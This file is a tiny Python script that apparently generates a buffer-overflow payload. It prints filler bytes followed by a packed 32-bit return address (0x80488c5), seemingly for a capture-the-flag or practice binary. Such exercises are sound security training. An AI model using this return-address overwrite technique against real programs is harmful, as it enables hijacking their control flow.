import sys
hexnum = 0x80488c5
hexnum.to_bytes(4, 'little')
from struct import pack

# sys.stdout.buffer.write(pack("<I", 0x80488c5))

sys.stdout.buffer.write(b"123456789123123123111")
sys.stdout.buffer.write(pack("<I", 0x80488c5))
